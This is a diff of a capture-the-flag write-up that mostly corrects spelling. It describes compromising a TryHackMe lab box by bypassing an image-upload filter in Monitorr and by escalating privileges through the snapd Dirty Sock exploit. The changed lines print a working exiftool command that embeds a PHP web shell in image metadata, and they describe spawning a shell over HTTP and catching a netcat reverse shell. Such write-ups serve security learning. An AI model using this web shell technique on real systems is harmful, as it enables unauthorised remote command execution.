@@ -360,9 +360,9 @@ I can see the local address of the machine (THM VPN) and some ids that don't wor
 
 ### Wait a minute... RCE?
 
-To be honest i spent hours trying to figure what to do next and trying to get something of the databases in  https://monitorr.robyns-petshop.thm. I went to sleep and when i woke up i checked the monitorr repo again. I saw an `upload.php` file in the `assets/php` folder... Wait... Is that in the box? How could i have missed it? So yeah... i checked and in fact it was there, im stupid and i had tunnel vision with the databases en data directories.
+To be honest i spent hours trying to figure what to do next and trying to get something of the databases in  https://monitorr.robyns-petshop.thm. I went to sleep and when i woke up i checked the monitorr repo again. I saw an `upload.php` file in the `assets/php` folder... wait... Is that in the box? How could i have missed it? So yeah... i checked and in fact it was there, im stupid and i had tunnel vision with the databases and the data directories.
 
-So i looked through the `upload.php` code in the github repo and looks like the validation is done using `getimagesize` what is exploitable good. I started up `postman` and started trying to `POST` an image (the parameter for the file to upload is called `fileToUpload` by the way) and what i got? "You are an exploit." WAIT WHAT? No this wasn't a bad thing, was just a beach image wtf. But i saw the problem more or less quick, i needed to add to `postman` the cookie `isHuman` with the value 1.
+So i looked through the `upload.php` code in the github repo and looks like the validation is done using `getimagesize` what is exploitable. I started up `postman` and started trying to `POST` an image (the parameter for the file to upload is called `fileToUpload` by the way) and what i got? "You are an exploit." WAIT WHAT? No this wasn't a bad thing, was just a beach image wtf. But i saw the problem more or less quick, i needed to add to `postman` the cookie `isHuman` with the value 1.
 
 After configuring `postman` with the cookie i was able to update my image. I noticed that this file wasn't exactly the same as the one i saw in GitHub because it was checking the extensions too and also was checking for the substring `php` anywhere in the filename. After some digging i got an image called `example.jpg.phtml` through the filter. I tried to upload a `php` file named that way but no luck, probably is using the `getimagesize` function too but i think i can bypass that too.
 
@@ -370,7 +370,7 @@ Using `exiftool` i added a payload as metadata to a normal image (Ty Ironhackers
 ```
 exiftool -Comment="<?php echo '<form action=\''.\$PHP_SELF.'\' method=\'post\'>Command:<input type=\'text\' name=\'cmd\'><input type=\'submit\'></form>'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();" example.jpg
 ```
-After that i renamed the image `example.jpg` to `example.jpg.phtml` and uploaded it. The file passed through the filer and when i checked the `assets/data/usrimg/` folder and clicked on it there it was, my little form to send commands. RCE YEYYYY.
+After that i renamed the image `example.jpg` to `example.jpg.phtml` and uploaded it. The file passed through the filer and when i checked the `assets/data/usrimg/` folder and clicked on it... there it was, my little form to send commands. RCE YEYYYY.
 
 ### flag1.txt
 
@@ -393,8 +393,8 @@ I found that the `at` command could be a privesc vector but `www-data` can't use
 So i got and idea and looks like im not the first with this problem. Looks like the shells are not comming back because some kind of firewall (more about this at the end) so i will need to use the webshell to spawn a full `pty`.
 
 - First i will use the RCE i got to upload or generate a `cmd.php` page that will work with `GET` requests
-- I will use the `tty-from-php-python.py` program. I got from [here](https://s4vitar.github.io/ttyoverhttp/#) and modified some parts. I know is a spanish site but im spanish, just go to the end of the article que check the code.
-- Once the program is executed first run: `script /dev/null -c bash` and got a pty (Thanks god)
+- I will use the `tty-from-php-python.py` program. I got it from [here](https://s4vitar.github.io/ttyoverhttp/#) and modified some parts. I know is a spanish site but im spanish, just go to the end of the article que check the code.
+- Once the program is executed first run: `script /dev/null -c bash` to get a pty (Thanks god)
 
 
 ### Enumerate, enumerate...
@@ -414,7 +414,7 @@ ldd (Ubuntu GLIBC 2.27-3ubuntu1.4) 2.27
 snap    2.32.5+18.04
 snapd   2.32.5+18.04 <---- https://www.exploit-db.com/exploits/46362
 ```
-The snapd version ended up being the key. Using my php `pty` thing i executed the script and...
+The snapd version ended up being the key, it was vulnerable to an exploit called Dirty Sock. Using my php `pty` thing i executed the exploit and...
 
 ```
       ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
@@ -467,4 +467,4 @@ THM{**************************}
 
 After getting root access i tried some things and i got a proper reverse shell, a bit late but hey at least i got it. The problem was an egress firewall, i just had to put netcat to listen in the 443 port (Remember to use your THM VPN IP to connect from the target machine to yours).
 
-I have to say that im pretty stuppid because in part i knew i could use `curl` and `wget` to get for example `google.com`but i think i just got obsess with the box and wasn't really thinking clearly. At least i got a new tool, not perfect but works. Also i should use `searchexploit` more, can be faster than `google`.
+I have to say that im pretty stuppid because in part i knew i could use `curl` and `wget` to get for example `google.com` but i think i just got obsessed with the box and wasn't really thinking clearly. At least i got a new tool, not perfect but works. Also i should use `searchexploit` more, can be faster than Google.
